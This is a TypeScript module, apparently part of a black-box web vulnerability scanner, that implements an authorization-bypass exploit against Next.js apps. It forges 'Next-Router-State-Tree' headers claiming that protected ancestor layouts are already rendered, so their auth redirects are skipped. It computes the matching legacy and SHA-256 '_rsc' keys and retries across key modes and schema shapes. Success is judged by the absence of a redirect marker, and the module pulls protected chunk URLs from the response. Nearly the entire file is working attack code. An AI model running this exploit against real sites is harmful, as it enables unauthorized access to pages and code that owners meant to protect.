import { createHash } from "node:crypto";
import rawRequest from "../../../exploit/utility/rawRequest.js";

/** Marker Next.js embeds in a Flight payload when a layout/page calls redirect(). */
const NEXT_REDIRECT_MARKER = "NEXT_REDIRECT";

export type LeafMode = "page" | "metadata-only";

/**
 * A forged ancestor segment. A plain string claims a static path segment (e.g.
 * `"dashboard"`) is mounted. `{ paramName, value }` claims a dynamic route segment (e.g.
 * `app/organizations/[org]/layout.js`) is mounted — Next.js's `matchSegment` requires an
 * exact `[paramName, value]` tuple for dynamic segments (a bare string never matches one),
 * and a black-box crawl can't know the app's real param name, only the URL's literal value.
 */
export type AncestorSegment = string | { paramName: string; value: string };

/**
 * Next.js's `flightRouterStateSchema` validates a dynamic segment as a `superstruct.tuple()`,
 * which requires an EXACT element count — too few OR too many elements both fail
 * `assert()` before `matchSegment` is ever reached, rejecting the entire request. That
 * exact count changed across Next.js releases: every version up to at least 16.2.6 requires
 * a 3-element tuple (`[paramName, value, dynamicParamType]`); 16.3.0 added a mandatory 4th
 * `staticSiblings` element (`[paramName, cacheKey, dynamicParamType, staticSiblings]`,
 * `null` meaning "siblings unknown"). A black-box crawl can't know which schema shape the
 * target's Next.js build expects, so both are tried (see `DYNAMIC_TUPLE_LENGTHS`).
 */
export type DynamicTupleLength = 3 | 4;

/** Converts one ancestor segment to its FlightRouterState wire representation. */
const toSegmentRepr = (
    segment: AncestorSegment,
    tupleLength: DynamicTupleLength
): string | [string, string, "d"] | [string, string, "d", null] =>
    typeof segment === "string"
        ? segment
        : tupleLength === 4
          ? [segment.paramName, segment.value, "d", null]
          : [segment.paramName, segment.value, "d"];

/** The literal URL path value of an ancestor segment, regardless of representation. */
export const ancestorSegmentValue = (segment: AncestorSegment): string =>
    typeof segment === "string" ? segment : segment.value;

/**
 * Builds the `Next-Router-State-Tree` header value: a URL-encoded FlightRouterState
 * claiming every segment in `ancestorSegments` is already client-rendered, with the
 * leaf segment either an ordinary `__PAGE__` node or (leafMode="metadata-only") a node
 * flagged so Next.js only re-executes `generateMetadata()` for it. Mirrors the
 * `flightRouterState[3]` check in `walk-tree-with-flight-router-state.tsx`. `tupleLength`
 * only affects segments that are dynamic-ancestor claims (see `toSegmentRepr`).
 */
export const buildStateTreeHeader = (
    ancestorSegments: AncestorSegment[],
    leafMode: LeafMode = "page",
    tupleLength: DynamicTupleLength = 4
): string => {
    let node: unknown = leafMode === "metadata-only" ? ["__PAGE__", {}, null, "metadata-only"] : ["__PAGE__", {}];
    for (let i = ancestorSegments.length - 1; i >= 0; i--) {
        node = [toSegmentRepr(ancestorSegments[i], tupleLength), { children: node }];
    }
    const tree = ["", { children: node }];
    return encodeURIComponent(JSON.stringify(tree));
};

/**
 * Strong `_rsc` cache-busting key: SHA-256 of the four cache-busting inputs, truncated to
 * 96 bits and base64url-encoded. Mirrors `computeCacheBustingSearchParam` in
 * `shared/lib/router/utils/cache-busting-search-param.ts` — not a secret, any client can
 * compute it from headers it itself sends.
 */
export const computeStrongRscKey = (
    stateTreeHeader: string,
    nextUrlHeader: string,
    prefetchHeader: string = "0",
    segmentPrefetchHeader: string = "0"
): string => {
    const input = [prefetchHeader, segmentPrefetchHeader, stateTreeHeader, nextUrlHeader].join(",");
    const digest = createHash("sha256").update(input).digest();
    return digest.subarray(0, 12).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
};

/**
 * 32-bit djb2xor hash, as used by Next.js's legacy (non-cryptographic) cache-busting key.
 * Mirrors `djb2Hash` in `shared/lib/hash.ts`.
 */
const djb2Hash = (str: string): number => {
    let hash = 5381;
    for (let i = 0; i < str.length; i++) {
        hash = ((hash << 5) + hash + str.charCodeAt(i)) & 0xffffffff;
    }
    return hash >>> 0;
};

/**
 * Legacy `_rsc` cache-busting key: `djb2Hash` of the same four inputs as
 * `computeStrongRscKey`, base36-encoded and truncated to 5 characters. Mirrors
 * `computeLegacyCacheBustingSearchParam`/`hexHash` in
 * `shared/lib/router/utils/cache-busting-search-param.ts` / `shared/lib/hash.ts`. Cheaper
 * to compute than the strong key, and some Next.js builds accept it as a fallback when the
 * strong-key check fails (see `NEXT-RSC-002`) — no crypto required to probe with it first.
 */
export const computeLegacyRscKey = (
    stateTreeHeader: string,
    nextUrlHeader: string,
    prefetchHeader: string = "0",
    segmentPrefetchHeader: string = "0"
): string => {
    const input = [prefetchHeader, segmentPrefetchHeader, stateTreeHeader, nextUrlHeader].join(",");
    return djb2Hash(input).toString(36).slice(0, 5);
};

/** True when a Flight/RSC payload records a server-side redirect (the auth check actually ran). */
export const containsNextRedirectMarker = (body: string): boolean => body.includes(NEXT_REDIRECT_MARKER);

/**
 * Extracts `static/chunks/*.js` (including Turbopack `~`-separated names) references from a
 * Flight payload body. Real payloads encode these WITHOUT a `_next/` prefix — e.g.
 * `4:I[3330,["614","static/chunks/app/dashboard/secret/page-<hash>.js"],"default"]` — the
 * client resolves them against its own asset prefix at runtime. An optional literal
 * `_next/` prefix is still matched for payload shapes that do include it.
 */
export const extractChunkPathsFromFlightBody = (body: string): string[] => {
    const matches = body.matchAll(/(?:_next\/)?static\/chunks\/[a-zA-Z0-9._\-/~]+\.js/g);
    return [...new Set([...matches].map((m) => m[0]))];
};

/** Resolves an extracted chunk path (with or without a `_next/` prefix) to an absolute URL. */
export const resolveChunkUrl = (chunkPath: string, origin: string): string => {
    const normalized = chunkPath.startsWith("_next/") ? chunkPath : `_next/${chunkPath}`;
    return new URL(`/${normalized}`, origin).toString();
};

export const REQUEST_TIMEOUT_MS = 15000;

export type RscKeyMode = "legacy" | "strong";

export interface ForgeAttemptResult {
    success: boolean;
    body: string;
}

/** Renders an ancestor-segment list back to its literal URL path, for the `Next-Url` header. */
export const ancestorsToPath = (ancestors: AncestorSegment[]): string => ancestors.map(ancestorSegmentValue).join("/");

/** True when at least one ancestor segment is a dynamic-route claim (see `AncestorSegment`). */
export const hasDynamicSegment = (ancestors: AncestorSegment[]): boolean =>
    ancestors.some((s) => typeof s !== "string");

/** Sends one forged-ancestor RSC request and reports whether it looks like a successful bypass. */
const attemptForge = async (
    candidateUrl: string,
    ancestors: AncestorSegment[],
    leafMode: LeafMode,
    keyMode: RscKeyMode,
    timeout: number,
    tupleLength: DynamicTupleLength
): Promise<ForgeAttemptResult> => {
    const stateTree = buildStateTreeHeader(ancestors, leafMode, tupleLength);
    const nextUrl = "/" + ancestorsToPath(ancestors);
    const rscKey =
        keyMode === "legacy" ? computeLegacyRscKey(stateTree, nextUrl) : computeStrongRscKey(stateTree, nextUrl);

    const forgedUrl = new URL(candidateUrl);
    forgedUrl.searchParams.set("_rsc", rscKey);

    const forged = await rawRequest(forgedUrl.toString(), {
        timeout,
        headers: {
            RSC: "1",
            "Next-Router-State-Tree": stateTree,
            "Next-Url": nextUrl,
        },
    });
    if (!forged) return { success: false, body: "" };

    const contentType = forged.headers["content-type"] ?? "";
    const success =
        forged.status === 200 && contentType.includes("text/x-component") && !containsNextRedirectMarker(forged.body);
    return { success, body: forged.body };
};

/**
 * Tries the cheap legacy key first (no SHA-256 needed); only computes and retries with the
 * strong key if the legacy attempt didn't succeed. Reports which key mode actually worked.
 */
const attemptForgeWithKeyFallback = async (
    candidateUrl: string,
    ancestors: AncestorSegment[],
    leafMode: LeafMode,
    timeout: number,
    tupleLength: DynamicTupleLength
): Promise<ForgeAttemptResult & { keyMode: RscKeyMode }> => {
    const legacy = await attemptForge(candidateUrl, ancestors, leafMode, "legacy", timeout, tupleLength);
    if (legacy.success) return { ...legacy, keyMode: "legacy" };

    const strong = await attemptForge(candidateUrl, ancestors, leafMode, "strong", timeout, tupleLength);
    return { ...strong, keyMode: "strong" };
};

/** Both dynamic-segment tuple lengths real Next.js servers can require — see `DynamicTupleLength`. */
const DYNAMIC_TUPLE_LENGTHS: readonly DynamicTupleLength[] = [4, 3];

/**
 * Wraps `attemptForgeWithKeyFallback` with a schema-shape fallback: an ancestor list with no
 * dynamic segment is tried once (tuple length is irrelevant — no dynamic segment ever reaches
 * `toSegmentRepr`'s tuple branch), but a list containing a dynamic-ancestor claim is retried
 * under each of `DYNAMIC_TUPLE_LENGTHS` until one is accepted, since a black-box crawl can't
 * know which schema shape the target's Next.js build expects (see `DynamicTupleLength`).
 */
export const attemptForgeWithSchemaFallback = async (
    candidateUrl: string,
    ancestors: AncestorSegment[],
    leafMode: LeafMode,
    timeout: number
): Promise<ForgeAttemptResult & { keyMode: RscKeyMode }> => {
    if (!hasDynamicSegment(ancestors)) {
        return attemptForgeWithKeyFallback(candidateUrl, ancestors, leafMode, timeout, 4);
    }
    let last: ForgeAttemptResult & { keyMode: RscKeyMode } = { success: false, body: "", keyMode: "legacy" };
    for (const tupleLength of DYNAMIC_TUPLE_LENGTHS) {
        last = await attemptForgeWithKeyFallback(candidateUrl, ancestors, leafMode, timeout, tupleLength);
        if (last.success) return last;
    }
    return last;
};
